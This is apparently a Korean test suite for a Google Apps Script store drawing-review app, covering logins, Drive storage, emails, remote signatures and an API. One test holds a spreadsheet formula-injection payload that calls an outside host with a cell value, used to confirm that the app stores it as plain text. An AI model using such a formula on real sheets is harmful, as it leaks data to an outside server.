const phs = ss.getSheetByName('자주쓰는문구'); phs.set(1, 2, ''); phs.set(2, 2, ''); phs.set(3, 1, '옛 문구');
ok(run('readPhrases_()').length === 2 && run('readPhrases_()')[1].c === '기타', '분류 열이 없던 예전 시트도 기타로 읽음');
// 끊김 후 같은 새 매장을 다시 보내도 한 번만 생성
const before = run('apiListStores(A)').length;
ctx.RC = { clientId: 'c-abc123xyz', tenant: '끊김 시험', reviewDate: '2026-10-28', notes: '(통합안전관리지침 방화및방염관련, p.91)', guideVer: '타워&몰 통합안전관리지침 (26년 개정판)' };
let r1 = run('apiSaveReview(A, RC, false)');
let r2 = run('apiSaveReview(A, RC, false)');
ok(r1.store.id === 'c-abc123xyz' && r2.store.id === r1.store.id && run('apiListStores(A)').length === before + 1 && r2.reviews.length === 1, '같은 새 매장을 두 번 보내도 매장 1개 · 1차 1개');
ok(r2.reviews[0].guideVer === '타워&몰 통합안전관리지침 (26년 개정판)', '적용 지침 저장');
ctx.RC2 = { clientId: 'bad id!', tenant: '이상한 ID' };
ok(run('apiSaveReview(A, RC2, false)').store.id.startsWith('uuid-'), '형식이 다른 clientId는 무시');
// QR 링크
ctx.HtmlService.createTemplateFromFile = () => { const t = { evaluate() { t.ok = true; return { setTitle() { return this; }, addMetaTag() { return this; }, setXFrameOptionsMode() { return this; } }; } }; ctx.__T = t; return t; };
ctx.HtmlService.XFrameOptionsMode = { ALLOWALL: 1 };
run('doGet({parameter:{store:"c-abc123xyz"}})');
ok(ctx.__T.startStore === 'c-abc123xyz', '?store=매장ID 로 열면 그 매장 전달');
run('doGet({parameter:{store:"<script>"}})');
ok(ctx.__T.startStore === '', '이상한 store 값은 무시');
ctx.ScriptApp.getService = () => ({ getUrl: () => 'https://script.google.com/macros/s/X/exec' });
ok(run('apiBootstrap(A)').appUrl === 'https://script.google.com/macros/s/X/exec', '웹앱 주소 제공 (QR용)');

console.log('1.3 · 드라이브에 PDF 저장');
ctx.PDFURI = 'data:application/pdf;filename=generated.pdf;base64,' + Buffer.from('%PDF-1.4 test').toString('base64');
ctx.SIDP = r1.store.id;
let pr = run('apiSavePdf(A, SIDP, 1, "에비뉴엘컨펌_x_1차.pdf", PDFURI)');
const pdfFolder = Object.values(drive.items).find(x => x.kind === 'folder' && x.name === '도면협의_출력');
const sub = pdfFolder && pdfFolder.children().find(x => x.name === r1.store.docNo);
ok(sub && sub.children().length === 1 && pr.url && pr.folder === '도면협의_출력/' + r1.store.docNo, 'PDF를 도면협의_출력/문서번호 폴더에 저장');
ok(Buffer.from(sub.children()[0].bytes).toString().startsWith('%PDF'), '저장된 파일 내용이 PDF');
run('apiSavePdf(A, SIDP, 1, "에비뉴엘컨펌_x_1차.pdf", PDFURI)');
ok(sub.children().length === 1, '같은 이름은 새 파일로 바꿈 (이전 것은 휴지통)');
threw = false; try { run('apiSavePdf(A, SIDP, 1, "x.pdf", "data:text/html;base64,PGI+")'); } catch (e) { threw = /PDF 내용/.test(e.message); }
ok(threw, 'PDF가 아니면 거부');

console.log('1.4 · 첫 화면 한 번에 · 팝업/VP 해당없음');
const st0 = run('apiStart(A)');
ok(st0.role === '소장' && st0.boot.fields.length && Array.isArray(st0.stores) && st0.stores.length > 1000, '로그인 확인 + 설정 + 매장 목록을 한 번에 (' + st0.stores.length + '개)');
threw = false; try { run('apiStart({role:"소장",pin:"0000"})'); } catch (e) { threw = /PIN/.test(e.message); }
ok(threw, '틀린 PIN이면 첫 화면 정보도 안 줌');
ctx.RP = { tenant: '팝업 시험', storeType: '팝업', kitchen: '있음', waterproof: '시공', supplyPipeA: '25', gasGrade: '1', sprReplace: '교체', diffReplace: '미교체', ceiling: '신설' };
let rp = run('apiSaveReview(A, RP, false)').reviews[0];
const PD = ['kitchen', 'waterproof', 'waterTest', 'supplyPipeA', 'drainPipeA', 'kitchenExt', 'exhaustCmh', 'gasGrade', 'gasAlarm', 'sprReplace', 'detReplace', 'diffReplace'];
ok(PD.every(k => rp[k] === '해당없음') && rp.ceiling === '신설', '팝업이면 주방·급배수·가스·설비 교체 12개 항목 해당없음 (다른 항목은 그대로)');
ctx.RV = { tenant: 'VP 시험', storeType: 'VP', detReplace: '교체' };
ok(run('apiSaveReview(A, RV, false)').reviews[0].detReplace === '해당없음', 'VP도 같음');
ctx.RB = { tenant: '본매장 시험', storeType: '본매장', kitchen: '해당없음', sprReplace: '교체', powerPhase: '화재예방단자함' };
rp = run('apiSaveReview(A, RB, false)').reviews[0];
ok(rp.kitchen === '해당없음' && rp.sprReplace === '교체' && rp.powerPhase === '화재예방단자함', '본매장은 입력값 그대로 (전원 방식 화재예방단자함)');

console.log('1.4 · 특이사항 사진');
ctx.JPG = 'data:image/jpeg;base64,' + Buffer.from('jpegdata').toString('base64');
ctx.SPH = r1.store.id;
const up = run('apiUploadPhoto(A, SPH, 1, JPG)');
const phRoot = Object.values(drive.items).find(x => x.kind === 'folder' && x.name === '도면협의_사진');
ok(up.fileId && phRoot && phRoot.children().some(f => f.name === r1.store.docNo && f.children().length === 1), '사진을 도면협의_사진/문서번호 폴더에 저장');
ctx.UPID = up.fileId;
ok(run('apiPhoto(A, UPID)') === ctx.JPG, '사진 보기 (data URL)');
threw = false; try { run('apiPhoto(A, PID)'); } catch (e) { threw = /도면협의 사진만/.test(e.message); }
ok(threw, '사진 폴더 밖 파일은 보여주지 않음');
threw = false; try { run('apiUploadPhoto(A, "c-없는매장id", 1, JPG)'); } catch (e) { threw = /저장/.test(e.message); }
ok(threw, '저장 전 매장에는 사진을 올릴 수 없음');
threw = false; try { run('apiUploadPhoto(A, SPH, 1, "data:text/html;base64,PGI+")'); } catch (e) { threw = /형식/.test(e.message); }
ok(threw, '사진이 아니면 거부');
const many = []; for (let i = 0; i < 13; i++) many.push({ id: 'p' + i, f: up.fileId, a: 5, x: 10, y: 20, w: 300, h: 200, r: i % 2 ? 90 : 45 });
many.push({ id: 'bad', f: 'x', a: 1 });
ctx.RPH = { storeId: r1.store.id, round: 1, tenant: '사진 시험', notes: '사진 시험 글', notesPhotos: JSON.stringify(many) };
let rph = run('apiSaveReview(A, RPH, false)').reviews.find(x => x.round === 1);
const savedPh = JSON.parse(rph.notesPhotos);
ok(savedPh.length === 10 && savedPh[0].r === 0 && savedPh[1].r === 90 && savedPh.every(p => p.f === up.fileId), '사진 목록 검사: 10장까지, 회전은 0/90/180/270만, 잘못된 파일 ID 제외');
ctx.RPH.notesPhotos = '{깨진 JSON';
ok(run('apiSaveReview(A, RPH, false)').reviews.find(x => x.round === 1).notesPhotos === '', '깨진 사진 목록은 비움');
ctx.RPH.notesPhotos = JSON.stringify(many.slice(0, 2));
run('apiSaveReview(A, RPH, false)');
const nx = run('apiNextRound(A, SPH)');
ok(nx.reviews[nx.reviews.length - 1].notesPhotos === '' && JSON.parse(nx.reviews[0].notesPhotos).length === 2, '다음 차수는 사진 비움 (이전 차수 사진은 그대로)');

console.log('1.5 · 검토서 삭제');
const delSh = ss.getSheetByName('삭제보관');
const delBefore = delSh.getLastRow();
const revBefore = run('readReviews_()').filter(r => r.storeId === ctx.SPH).length;
const phFolder = phRoot.children().find(f => f.name === r1.store.docNo);
const pdfFolder2 = Object.values(drive.items).find(x => x.kind === 'folder' && x.name === '도면협의_출력').children().find(f => f.name === r1.store.docNo);
run('apiSetConfirmed(A, SPH, true)');
threw = false; try { run('apiDeleteStore(A, SPH)'); } catch (e) { threw = /컨펌완료를 먼저 취소/.test(e.message); }
ok(threw, '컨펌완료된 매장은 삭제 거부 (먼저 컨펌완료 취소)');
run('apiSetConfirmed(A, SPH, false)');
let afterDel = run('apiDeleteStore(A, SPH)');
ok(!afterDel.some(x => x.id === ctx.SPH) && run('readReviews_()').filter(r => r.storeId === ctx.SPH).length === 0, '매장과 모든 차수 삭제 (' + revBefore + '개 차수)');
ok(delSh.getLastRow() === delBefore + revBefore, '모든 차수를 삭제보관 탭으로 옮김');
ok(phFolder.trashed && pdfFolder2.trashed, '드라이브의 이 매장 사진·PDF 폴더는 휴지통으로');
threw = false; try { run('apiDeleteStore(A, SPH)'); } catch (e) { threw = /이미 삭제/.test(e.message); }
ok(threw, '이미 지운 검토서는 안내');
// 마지막 번호를 지워도 다시 쓰지 않음
ctx.RX = { tenant: '마지막 매장', reviewDate: '2026-10-29' };
const bx2 = run('apiSaveReview(A, RX, false)');
const seqX = Number(bx2.store.seq);
run('apiDeleteStore(A, "' + bx2.store.id + '")');
ctx.RY = { tenant: '그다음 매장', reviewDate: '2026-10-29' };
const by2 = run('apiSaveReview(A, RY, false)');
ok(Number(by2.store.seq) === seqX + 1, '지운 문서번호(' + seqX + ')는 다시 쓰지 않고 이어감 → ' + by2.store.docNo);
const logRows = ss.getSheetByName('변경기록'); let hasDel = false;
for (let r = 2; r <= logRows.getLastRow(); r++) if (logRows.get(r, 3) === '검토서 삭제') hasDel = true;
ok(hasDel, '변경기록에 검토서 삭제 남김');

console.log('1.6 · 소방 점검 예정일 · 시방서 발송');
ctx.RF = { tenant: '시방서 매장', reviewDate: '2026-10-30', periodStart: '2026-11-02', periodEnd: '2026-11-17', fireCheckDate: '2026-11-18', openDate: '2026-11-20', contractorEmail: '' };
let bf = run('apiSaveReview(A, RF, false)');
ok(bf.reviews[0].fireCheckDate === '2026-11-18', '검토서 시트에 소방점검예정일 저장');
const sf = run('apiListStores(A)').find(x => x.id === bf.store.id);
ok(sf.periodStart === '2026-11-02' && sf.periodEnd === '2026-11-17' && sf.fireCheckDate === '2026-11-18', '매장 목록에도 공사 기간·소방 점검일 (달력용)');
// 시방서 파일
const z1 = mkFile('01_Tenant 시방서.zip', 'application/zip', Buffer.alloc(100), gRoot.id);
const z2 = mkFile('02_B1F The Crown 시방서.zip', 'application/zip', Buffer.alloc(50), gRoot.id);
[z1, z2].forEach(z => { z.access = 'PRIVATE'; z.getSharingAccess = function () { return this.access; }; z.setSharing = function (a) { this.access = a; }; });
ctx.DriveApp.Access = { ANYONE_WITH_LINK: 'ANYONE_WITH_LINK', PRIVATE: 'PRIVATE' };
ctx.DriveApp.Permission = { VIEW: 'VIEW' };
const sent = [];
ctx.GmailApp = { getAliases: () => ['max2122@nate.com'], sendEmail: (to, subj, body, o) => sent.push({ to, subj, body, o }) };
ctx.MailApp = { getRemainingDailyQuota: () => 99 };
let info = run('apiSpecInfo(A)');
ok(info.specs[0].name === '01_Tenant 시방서.zip' && info.specs[1].name === '02_B1F The Crown 시방서.zip' && info.fromOk, '지침 폴더 ZIP 찾기: Tenant / Crown, 보내는 주소 확인');
ok(!info.specs.some(x => /pdf/i.test(x.name || '')), 'PDF는 시방서로 안 잡힘');
ctx.SF = bf.store.id;
threw = false; try { run('apiSendSpec(A, SF, 1, ["tenant"], "")'); } catch (e) { threw = /이메일/.test(e.message); }
ok(threw && !sent.length, '시공업체 이메일이 없으면 발송 거부');
ctx.RF.storeId = bf.store.id; ctx.RF.round = 1; ctx.RF.contractorEmail = 'kim@daehan.co.kr';
run('apiSaveReview(A, RF, false)');
let rsend = run('apiSendSpec(A, SF, 1, ["crown", "tenant", "zzz"], "착공 전 확인 부탁드립니다.")');
ok(sent.length === 1 && sent[0].to === 'kim@daehan.co.kr' && sent[0].o.from === 'max2122@nate.com' && sent[0].o.name === '잠실점 에비뉴엘 시설팀', 'nate 주소로 시공업체에게 1통');
ok(sent[0].subj === '[잠실점 에비뉴엘] 시방서 매장 시방서 송부' && sent[0].body.indexOf('https://drive/' + z1.id) > 0 && sent[0].body.indexOf('https://drive/' + z2.id) > 0 && /착공 전 확인/.test(sent[0].body), '제목·두 링크·덧붙일 말');
ok(z1.access === 'ANYONE_WITH_LINK' && z2.access === 'ANYONE_WITH_LINK', 'ZIP 공유: 링크가 있는 모든 사용자');
const rec = JSON.parse(rsend.store.specSent);
ok(rec.length === 2 && rec.every(x => x.to === 'kim@daehan.co.kr' && /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/.test(x.at)), '발송 기록: 시방서별 날짜·시간 (매장 시방서발송 칸)');
let logHas = false; const lg = ss.getSheetByName('변경기록'); for (let r = 2; r <= lg.getLastRow(); r++) if (lg.get(r, 3) === '시방서 발송') logHas = true;
ok(logHas, '변경기록에 시방서 발송');
ctx.GmailApp.getAliases = () => [];
run('apiSendSpec(A, SF, 1, ["tenant"], "")');
ok(!sent[1].o.from && sent[1].o.replyTo === 'max2122@nate.com', '보내기 주소가 없으면 구글 계정으로 보내고 답장은 nate로');
z2.trashed = true;
threw = false; try { run('apiSendSpec(A, SF, 1, ["crown"], "")'); } catch (e) { threw = /Crown 시방서 ZIP 파일이 없습니다/.test(e.message); }
ok(threw && run('apiSpecInfo(A)').specs[1].missing, '파일이 없으면 안내');
ctx.MailApp.getRemainingDailyQuota = () => 0;
threw = false; try { run('apiSendSpec(A, SF, 1, ["tenant"], "")'); } catch (e) { threw = /메일 수를 다 썼습니다/.test(e.message); }
ok(threw, '하루 발송 한도 초과 안내');
// 1.5 → 1.6: 매장 목록 채우기
const stSh = ss.getSheetByName('매장'); let pc = 0; for (let c = 1; c <= stSh.getLastColumn(); c++) if (stSh.get(1, c) === '소방점검예정일') pc = c;
const rowF = run('findStore_(SF)').rowIndex; stSh.set ? stSh.set(rowF, pc, '') : stSh.getRange(rowF, pc).setValue('');
run('backfillStores_()');
ok(run('apiListStores(A)').find(x => x.id === ctx.SF).fireCheckDate === '2026-11-18', '버전 올릴 때 기존 매장 목록에 날짜 채우기');

console.log('1.7 · 기기 기억 로그인 · 메일 서명');
const st17 = run('apiStart(A)');
ok(st17.token && st17.token.length === 64, '로그인하면 기기 기억용 표(token)');
ctx.TK = { role: '소장', token: st17.token };
ok(run('apiListStores(TK)').length > 0, 'PIN 없이 기억한 표로 사용');
props['PIN_부소장'] = run('hash_("1357")');
threw = false; try { run('apiListStores({role:"부소장", token: TK.token})'); } catch (e) { threw = /PIN이 바뀌었습니다/.test(e.message); }
ok(threw, '다른 역할로는 통하지 않음');
const oldPin = props['PIN_소장']; props['PIN_소장'] = run('hash_("9999")');
threw = false; try { run('apiListStores(TK)'); } catch (e) { threw = /PIN이 바뀌었습니다/.test(e.message); }
ok(threw, 'PIN을 바꾸면 예전 기억은 거절 → 다시 PIN');
props['PIN_소장'] = oldPin;
ctx.MailApp.getRemainingDailyQuota = () => 9; ctx.GmailApp.getAliases = () => ['max2122@nate.com'];
run('apiSendSpec(A, SF, 1, ["tenant"], "덧붙임")');
const m = sent[sent.length - 1];
ok(m.body.indexOf('덧붙임') < m.body.lastIndexOf('에비뉴엘 시설팀') && /T\. 02-3213-2456 \/ 02-3213-2119 \/ 02-3213-2122\nE\. max2122@nate\.com\nW\. http:\/\/www\.maxerve\.co\.kr\/$/.test(m.body), '본문 끝: 링크 → 덧붙일 말 → 서명 4줄');
ok(m.o.htmlBody.indexOf('<a href="mailto:max2122@nate.com">') > 0 && m.o.htmlBody.indexOf('<a href="http://www.maxerve.co.kr/">') > 0 && m.o.htmlBody.indexOf('<b>에비뉴엘 시설팀</b>') > 0, '서명의 메일·홈페이지는 링크');
ok(run('apiSpecInfo(A)').signature.length === 4, '발송 창 미리보기에 서명 전달');

console.log('1.7 · PIN만으로 로그인 · 소장 확인');
let lg1 = run('apiStart({pin:"2468"})'); ok(lg1.role === '소장' && lg1.token, 'PIN만 넣으면 소장으로');
let lg2 = run('apiLogin({pin:"1357"})'); ok(lg2.role === '부소장', '부소장 PIN이면 부소장으로');
threw = false; try { run('apiLogin({pin:"0000"})'); } catch (e) { threw = /PIN이 맞지 않습니다/.test(e.message); }
ok(threw, '틀린 PIN 거부');
// 1.8.5 (결정 39): 기기와 상관없이 10분 안에 20번 틀리면 PIN 입력을 모두 10분 막음, 기기 기억 로그인은 그대로
delete props.PIN_FAIL;
for (let i = 0; i < 19; i++) { try { run('apiLogin({pin:"' + String(1000 + i) + '"})'); } catch (e) {} }
ok(run('apiLogin({pin:"2468"})').role === '소장', '19번 틀려도 맞는 PIN은 들어감');
try { run('apiLogin({pin:"9999"})'); } catch (e) {}
threw = false; try { run('apiLogin({pin:"2468"})'); } catch (e) { threw = /10분 동안/.test(e.message); }
ok(threw, '20번 틀리면 맞는 PIN도 10분 막음');
ok(run('apiStart({role:"소장",token:' + JSON.stringify(lg1.token) + '})').role === '소장', '막혀 있어도 기기에 기억된 로그인은 열림');
// 1.8.6 (결정 41): 6시간 안에 3번째 잠금부터는 1시간
const failN = n => { for (let i = 0; i < n; i++) { try { run('apiLogin({pin:"0001"})'); } catch (e) {} } };
const unlockPin = () => { const v = JSON.parse(props.PIN_FAIL); v.lock = Date.now() - 1; props.PIN_FAIL = JSON.stringify(v); };
unlockPin(); failN(20); let pf = JSON.parse(props.PIN_FAIL);
ok(pf.locks === 2 && pf.lock - Date.now() <= 600000, '2번째 잠금은 10분');
unlockPin(); failN(20); pf = JSON.parse(props.PIN_FAIL);
threw = false; try { run('apiLogin({pin:"2468"})'); } catch (e) { threw = /(5[0-9]|60)분 동안/.test(e.message); }
ok(pf.locks === 3 && pf.lock - Date.now() > 3000000 && threw, '6시간 안 3번째 잠금은 1시간 (남은 분 표시)');
delete props.PIN_FAIL;
ok(run('apiLogin({pin:"1357"})').role === '부소장', '잠금 풀리면 다시 PIN 로그인');
// 같은 PIN 거부 (시트 메뉴 ② PIN 설정)
let alerts = [];
ctx.SpreadsheetApp.getUi = () => ({ prompt: () => ({ getSelectedButton: () => 'OK', getResponseText: () => '1357' }), Button: { OK: 'OK' }, ButtonSet: { OK_CANCEL: 1, OK: 2 }, alert: m => alerts.push(m) });
const pinBefore = props['PIN_소장'];
run('setPinChief_()');
ok(props['PIN_소장'] === pinBefore && /부소장 PIN과 같습니다/.test(alerts[0]), '소장 PIN을 부소장 PIN과 같게 바꾸면 거부');
ctx.RC = { tenant: '소장확인 매장', reviewDate: '2026-10-30' };
let bc = run('apiSaveReview(A, RC, false)'); ctx.SC = bc.store.id;
ok(bc.reviews[0].chiefOk === false && run('apiListStores(A)').find(x => x.id === ctx.SC).chiefOk === '', '새 검토서는 소장 확인 전');
ctx.DEP = { role: '부소장', pin: '1357' };
threw = false; try { run('apiSetChiefOk(DEP, SC, 1, true)'); } catch (e) { threw = /소장 PIN으로 접속했을 때만/.test(e.message); }
ok(threw, '부소장은 소장 확인 불가');
let bk = run('apiSetChiefOk(A, SC, 1, true)');
ok(bk.reviews[0].chiefOk === true && bk.reviews[0].chiefOkBy === '소장' && /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/.test(bk.reviews[0].chiefOkAt), '소장 확인: 누가·언제 시트에');
ok(bk.store.chiefOk === 'Y', '매장 목록(대시보드)에 소장 확인');
ctx.RC.storeId = ctx.SC; ctx.RC.round = 1; ctx.RC.location = '3';
let bs = run('apiSaveReview(A, RC, false)');
ok(bs.reviews[0].chiefOk === true, '검토서를 다시 저장해도 소장 확인은 그대로');
run('apiSetConfirmed(A, SC, true)');
ok(run('apiSetChiefOk(A, SC, 1, false)').reviews[0].chiefOk === false && run('apiSetChiefOk(A, SC, 1, true)').reviews[0].chiefOk === true, '컨펌완료로 잠겨도 소장 확인·취소 가능');
run('apiSetConfirmed(A, SC, false)');
let nr = run('apiNextRound(A, SC)');
ok(nr.reviews[1].chiefOk === false && nr.store.chiefOk === '', '다음 차수는 소장 확인 전으로 시작, 대시보드는 마지막 차수 기준');
let lgC = false; const lgS = ss.getSheetByName('변경기록'); for (let r = 2; r <= lgS.getLastRow(); r++) if (lgS.get(r, 3) === '소장 확인') lgC = true;
ok(lgC, '변경기록에 소장 확인');

console.log('1.8 · 설비 교체·서류 미제출·서류 요청·원격 서명·PDF 보관·블럭 연동');
ctx.ScriptApp.getService = () => ({ getUrl: () => 'https://script.google.com/macros/s/APP/exec' });
ctx.Utilities.getUuid = () => crypto.randomUUID(); // 실제처럼 16진수
ctx.MailApp.getRemainingDailyQuota = () => 50; ctx.GmailApp.getAliases = () => ['max2122@nate.com'];
ctx.R8 = { tenant: '1.8 매장', reviewDate: '2026-10-31', contractorCompany: '대한인테리어', contractorName: '김시공', contractorEmail: 'kim@daehan.co.kr',
  docInsurance: '미제출', docCad: '미제출', docFR: '제출', docFRPlan: '미제출', sprReplace: '교체', detReplace: '미교체', diffReplace: '교체', powerPhase: '화재예방단자함', salesName: '이영업' };
let b8 = run('apiSaveReview(A, R8, false)'); ctx.S8 = b8.store.id;
ok(b8.reviews[0].sprReplace === '교체' && b8.reviews[0].diffReplace === '교체' && b8.reviews[0].powerPhase === '화재예방단자함', '설비 교체 3항목·화재예방단자함 저장');
ok(b8.store.docMissing === '영업배상 책임보험, 설계도면(CAD), 방염계획도', '매장 목록에 미제출 서류 (대시보드 "서류 미제출")');
const n0 = sent.length;
let bd = run('apiSendDocReq(A, S8, 1, ["docInsurance","docCad","docFR","docFRPlan"], "11/5까지")');
const dm = sent[sent.length - 1];
ok(sent.length === n0 + 1 && dm.to === 'kim@daehan.co.kr' && /설계도면\(CAD\)/.test(dm.body) && /방염계획도/.test(dm.body) && !/영업배상/.test(dm.body) && !/· 방염서류/.test(dm.body), '서류 요청: 미제출 중 설계도면·방염계획도만 (보험·제출된 방염서류 빼고)');
ok(/11\/5까지/.test(dm.body) && /W\. http:\/\/www\.maxerve\.co\.kr\/$/.test(dm.body) && dm.o.from === 'max2122@nate.com', '덧붙일 말 + 서명, nate 주소로');
let lg8 = JSON.parse(bd.store.sendLog);
ok(lg8.length === 1 && lg8[0].t === 'doc' && lg8[0].d === '설계도면(CAD), 방염계획도', '발송 기록에 서류 요청');
// PDF 보관
const pdfUri = 'data:application/pdf;base64,' + Buffer.from('%PDF-1.4 test').toString('base64');
let ps = run('apiSavePdf(A, S8, 1, "자동.pdf", "' + pdfUri + '", true)');
ok(ps.url && JSON.parse(ps.store.sendLog).some(x => x.t === 'pdf' && /자동 보관/.test(x.d) && x.url), 'PDF 자동 보관 → 발송 기록에 "PDF 보관 · 열기"');
// 원격 서명 요청
threw = false; try { run('apiSigRequest(A, S8, 1, [{who:"safety", email:"bad"}], "' + pdfUri + '", "s.pdf")'); } catch (e) { threw = /이메일 형식/.test(e.message); }
ok(threw, '이메일이 틀리면 거부');
const n1 = sent.length;
let sr = run('apiSigRequest(A, S8, 1, [{who:"safety", email:"safety.park@lotte.net"},{who:"resp", email:"kim@daehan.co.kr"}], "' + pdfUri + '", "검토서.pdf")');
ok(sent.length === n1 + 2, '두 사람에게 각각 메일');
const sm = sent[sent.length - 2];
const tok = (sm.body.match(/\?sign=([0-9a-f]+)/) || [])[1];
ok(tok && tok.length >= 40 && /서명은 휴대폰으로 진행 가능합니다\. PC에서는 마우스로 서명할 수 있습니다\./.test(sm.body) && /검토서 보기 : https:\/\/drive\//.test(sm.body), '메일: 검토서 PDF 링크 + 서명 링크 + 휴대폰 안내');
ok(/여기를 눌러 서명하기/.test(sm.o.htmlBody), '메일의 서명하기 버튼');
const pdfFile = Object.values(drive.items).filter(x => x.kind === 'file' && x.name === '검토서.pdf')[0];
ok(pdfFile && pdfFile.access === 'ANYONE_WITH_LINK', '검토서 PDF는 링크가 있는 모든 사용자 보기');
ok(JSON.parse(sr.store.sigPending)['1:safety'] && JSON.parse(sr.store.sigPending)['1:resp'] && sr.sigEmails.safety === 'safety.park@lotte.net' && !sr.sigEmails.resp, '서명 요청 중 표시 + 안전관리팀 주소 기억 (공사 책임자는 기억 안 함)');
ok(run('apiBootstrap(A)').sigEmails.safety === 'safety.park@lotte.net', '다음에 열 때 안전관리팀 주소 미리 채움');
ctx.TOK = tok;
let sinfo = run('apiSignInfo(TOK)');
ok(sinfo.who === '안전관리팀' && sinfo.tenant === '1.8 매장' && sinfo.pdfUrl && sinfo.org === '롯데쇼핑', '서명 페이지: 그 칸 정보만 (PIN 없이)');
threw = false; try { run('apiSignSubmit(TOK, {name:"", tel:"01022223333", sig:"data:image/png;base64,AAA"})'); } catch (e) { threw = /성명/.test(e.message); }
ok(threw, '성명 없으면 거부');
threw = false; try { run('apiSignSubmit(TOK, {name:"박안전", tel:"010", sig:"data:image/png;base64,AAA"})'); } catch (e) { threw = /연락처/.test(e.message); }
ok(threw, '연락처 없으면 거부');
let ssub = run('apiSignSubmit(TOK, {name:"박안전", tel:"010-2222-3333", sig:"data:image/png;base64,AAAA"})');
let rv8 = run('reviewOf_(S8, 1)');
ok(ssub.ok && rv8.safetyName === '박안전' && rv8.safetyTel === '010-2222-3333' && rv8.safetySig === 'data:image/png;base64,AAAA' && /^\d{4}-\d{2}-\d{2}$/.test(rv8.safetySigDate), '서명이 검토서 안전관리팀 성명·연락처·서명·날짜에 들어감');
threw = false; try { run('apiSignInfo(TOK)'); } catch (e) { threw = /이미 서명/.test(e.message); }
ok(threw, '한 번 쓴 링크는 다시 못 씀');
let st8 = run('findStore_(S8)').row;
ok(!JSON.parse(st8.sigPending)['1:safety'] && JSON.parse(st8.sigPending)['1:resp'] && JSON.parse(st8.sendLog).some(x => x.t === 'sig' && /박안전/.test(x.d)), '서명 요청 중 표시 지움 + 발송 기록 "서명 완료"');
// 화면을 열어 둔 채 저장해도 원격 서명은 그대로
ctx.R8.storeId = ctx.S8; ctx.R8.round = 1; ctx.R8.location = '5';
let keep = run('apiSaveReview(A, R8, false)').reviews[0];
ok(keep.safetySig === 'data:image/png;base64,AAAA' && keep.safetyName === '박안전' && keep.salesName === '이영업', '열어 둔 화면에서 저장해도 원격 서명은 지워지지 않음');
ctx.R8._sigCleared = ['safetySig'];
let clr = run('apiSaveReview(A, R8, false)').reviews[0];
ok(!clr.safetySig, '화면에서 「서명 삭제」한 칸은 지움');
// 만료
const tok2 = (sent[sent.length - 1].body.match(/\?sign=([0-9a-f]+)/) || [])[1]; ctx.TOK2 = tok2;
const k2 = run('sigKey_(TOK2)'); const t2 = JSON.parse(props[k2]); t2.exp = Date.now() - 1000; props[k2] = JSON.stringify(t2);
threw = false; try { run('apiSignInfo(TOK2)'); } catch (e) { threw = /7일/.test(e.message); }
ok(threw, '7일 지나면 만료');
threw = false; try { run('apiSignInfo("zzzz")'); } catch (e) { threw = /올바르지/.test(e.message); }
ok(threw, '엉뚱한 링크 거부');
// 1.8.6 (결정 41): 원격 서명 이름 칸에 수식을 넣어도 글자로 저장
run('apiSigRequest(A, S8, 1, [{who:"sales", email:"sales.kim@lotte.net"}], "' + pdfUri + '", "검토서3.pdf")');
ctx.TOK3 = (sent[sent.length - 1].body.match(/\?sign=([0-9a-f]+)/) || [])[1];
ctx.EVIL = '=IMPORTXML("https://x.io/"&B2,"//a")';
const rvSh = ss.getSheetByName('검토서'), fBefore = rvSh.formulas || 0;
run('apiSignSubmit(TOK3, {name: EVIL, tel:"010-2222-3333", sig:"data:image/png;base64,AAAA"})');
ok((rvSh.formulas || 0) === fBefore && run('reviewOf_(S8, 1)').salesName === ctx.EVIL, '원격 서명 이름에 수식을 넣어도 수식이 되지 않고 글자 그대로');
ok(run('noFormula_("-3")') === "'-3" && run('noFormula_("010-1")') === '010-1' && run('noFormula_(null)') === '', '= + - @ 로 시작할 때만 앞에 작은따옴표');
// 블럭 연동
ctx.ContentService = { MimeType: { JSON: 'json' }, createTextOutput: t => ({ t, setMimeType() { return this; } }) };
const J = code => JSON.parse(run(code).t);
ok(J('doGet({parameter:{api:"ping"}})').block === 'drawing-review', 'ping: 블럭 이름·버전');
ok(/연결 키가 아직/.test(J('doGet({parameter:{api:"summary",key:"x"}})').error), '연결 키 없으면 거부');
props.LINK_KEY = 'k'.repeat(40);
ok(/맞지 않습니다/.test(J('doGet({parameter:{api:"summary",key:"bad"}})').error), '틀린 키 거부');
const sm8 = J('doGet({parameter:{api:"summary",key:"' + 'k'.repeat(40) + '",year:"2026"}})');
ok(sm8.ok && sm8.counts.total > 0 && sm8.counts.docMissing >= 1 && sm8.labels.chiefWaiting === '시설 소장 확인 대기', '요약 숫자 (연도별)');
const sl8 = J('doGet({parameter:{api:"stores",key:"' + 'k'.repeat(40) + '"}})');
const one = sl8.stores.find(x => x.storeId === ctx.S8);
ok(one && one.contractorEmail === 'kim@daehan.co.kr' && one.docNo && /\?store=/.test(one.url), '매장 목록 (하자점검용: 업체·담당·이메일·바로 열기 주소)');
ok(/POST/.test(J('doGet({parameter:{api:"defect",key:"' + 'k'.repeat(40) + '",storeId:"' + ctx.S8 + '"}})').error), '하자 발송 기록은 POST만');
const df = J('doPost({postData:{contents: JSON.stringify({api:"defect", key:"' + 'k'.repeat(40) + '", storeId:"' + ctx.S8 + '", count:3, note:"천장 마감", by:"업무지원 앱"})}})');
ok(df.ok && /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/.test(df.defectSent), '하자 발송 기록 → 매장 하자발송 날짜');
ok(JSON.parse(run('findStore_(S8)').row.sendLog).some(x => x.t === 'defect' && /3건/.test(x.d)), '발송 기록에 하자 발송');
ok(J('doPost({postData:{contents:"{bad"}})').ok === false, '잘못된 JSON 거부');

// 1.8.2 종합방재실 협의서 (매장마다 1장)
console.log('\n1.8.2 종합방재실 협의서');
ctx.JPG2 = 'data:image/jpeg;base64,' + Buffer.from('fake-jpeg-fd').toString('base64');
const fb1 = run('apiFireDocUpload(A, S8, JPG2)');
const fd1 = JSON.parse(fb1.store.fireDoc);
ok(fd1.f && fd1.r === 0 && /^\d{4}-\d{2}-\d{2}_방재실협의서-.+_001\.jpg$/.test(fd1.name), '올리기 → 매장 방재실협의서 칸 (이름 날짜_방재실협의서-테넌트_001.jpg) ' + fd1.name);
ok(!/[\s_]/.test(fd1.name.split('_')[1]), '작업명 안에 띄어쓰기·밑줄 없음');
const fv = run('apiFireDoc(A, S8)');
ok(fv.url === ctx.JPG2 && fv.r === 0, '보기: 같은 사진, 방향 0');
